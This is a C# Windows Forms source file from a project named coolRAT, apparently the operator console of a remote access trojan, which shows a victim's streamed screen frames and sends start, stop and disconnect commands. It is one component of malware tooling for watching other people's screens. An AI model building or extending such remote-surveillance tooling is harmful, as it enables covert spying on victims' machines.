using coolRAT.Libs;
using coolRAT.Libs.Connections;
using coolRAT.Libs.Packets;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace coolRAT.Master
{
    public partial class ScreenWindow : Form
    {
        public Guid UniqueScreenId;
        public Client RemoteClient;
        public Bitmap LastFrame;
        public ScreenWindow(Guid uniqueScreenId, Client remoteClient)
        {
            UniqueScreenId = uniqueScreenId;
            RemoteClient = remoteClient ?? throw new ArgumentNullException(nameof(remoteClient));
            RemoteClient.RegisterPacketHandler("ScreenFramePacket", PacketReceived_Handler);
            LastFrame = null;
            InitializeComponent();
        }

        public void PacketReceived_Handler(object sender, PacketReceivedEventArgs e)
        {
            if(e.Packet.Type == "ScreenFramePacket")
            {
                ScreenFramePacket packet = ScreenFramePacket.Deserialize(e.RawPacket);
                if(packet.FrameType == FrameType.Full)
                {
                    LastFrame = packet.Frame;
                    ImageBox.Image = LastFrame;
                    return;
                }

                if(packet.FrameType == FrameType.Partial)
                {
                    if (LastFrame == null) return;
                    LastFrame = ImageUtils.Diff2Vector(LastFrame, packet.Frame);
                    ImageBox.Image = LastFrame;
                }
            }
        }

        private void ScreenWindow_Shown(object sender, EventArgs e)
        {
            Task.Run(() =>
            {
                ScreenCommandPacket screenCommandPacket;
                screenCommandPacket = new ScreenCommandPacket(RemoteClient.UniqueId, UniqueScreenId, Libs.Packets.CommandType.RequestFrame, "Full");
                RemoteClient.SendPacket(screenCommandPacket);
                Thread.Sleep(500);
                screenCommandPacket = new ScreenCommandPacket(RemoteClient.UniqueId, UniqueScreenId, Libs.Packets.CommandType.SetState, "Running");
                RemoteClient.SendPacket(screenCommandPacket);
            });
        }

        private void Start_Btn_Click(object sender, EventArgs e)
        {
            ScreenCommandPacket screenCommandPacket = new ScreenCommandPacket(RemoteClient.UniqueId, UniqueScreenId, Libs.Packets.CommandType.SetState, "Running");
            RemoteClient.SendPacket(screenCommandPacket);
        }

        private void Stop_Btn_Click(object sender, EventArgs e)
        {
            ScreenCommandPacket screenCommandPacket = new ScreenCommandPacket(RemoteClient.UniqueId, UniqueScreenId, Libs.Packets.CommandType.SetState, "Stopped");
            RemoteClient.SendPacket(screenCommandPacket);
        }

        private void ScreenWindow_FormClosing(object sender, FormClosingEventArgs e)
        {
            DisconnectScreenPacket disconnectScreenPacket = new DisconnectScreenPacket(RemoteClient.UniqueId, UniqueScreenId);
            RemoteClient.SendPacket(disconnectScreenPacket);
        }
    }
}
